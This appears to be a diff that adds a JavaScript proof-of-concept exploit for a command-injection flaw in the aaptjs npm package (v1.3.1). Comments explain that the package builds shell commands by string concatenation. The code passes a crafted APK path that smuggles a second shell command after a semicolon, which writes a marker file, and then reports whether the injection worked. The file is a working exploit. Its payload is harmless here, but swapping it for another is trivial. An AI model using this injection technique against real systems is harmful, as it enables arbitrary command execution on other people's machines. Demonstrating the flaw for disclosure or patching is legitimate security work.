@@ -1,0 +1,29 @@
+```javascript
+'use strict';
+
+// Exploit for aaptjs (v1.3.1) command injection.
+// index.js builds shell commands via plain string concatenation
+// (e.g. `${aapt} l ${apkfilePath}`) and executes them with shelljs' `exec`,
+// which runs the string through /bin/sh. Any shell metacharacters in the
+// user-supplied "apkfilePath" argument are interpreted by the shell,
+// giving full command injection.
+
+const aapt = require('aaptjs');
+
+// Marker file that only gets created if our injected command runs.
+const marker = require('path').join(__dirname, 'PWNED_' + Date.now());
+
+// Malicious "apk path" that breaks out of the intended `aapt l <path>` command
+// and runs an arbitrary OS command.
+const malicious = `foo.apk; touch ${marker}; echo INJECTED > ${marker}`;
+
+aapt.list(malicious, (err, out) => {
+  const fs = require('fs');
+  if (fs.existsSync(marker)) {
+    console.log('[+] Command injection succeeded! Marker file created:', marker);
+    console.log('[+] Marker contents:', fs.readFileSync(marker, 'utf8').trim());
+  } else {
+    console.log('[-] Marker file not found, injection may have failed.');
+  }
+});
+```
